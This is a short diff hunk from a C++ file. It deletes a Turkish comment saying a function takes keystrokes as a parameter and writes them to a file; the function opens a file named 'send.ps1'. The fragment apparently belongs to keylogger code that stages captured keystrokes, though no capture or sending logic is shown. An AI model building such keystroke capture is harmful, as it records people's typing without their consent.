@@ -8,7 +8,7 @@ using namespace std;
 
 
 void special_characters(string text) { 
-    //parametre olarak direk tuş vuruşunu alıyor ve dosyaya yazdırıyor
+
     ofstream file;
     file.open("send.ps1");
 
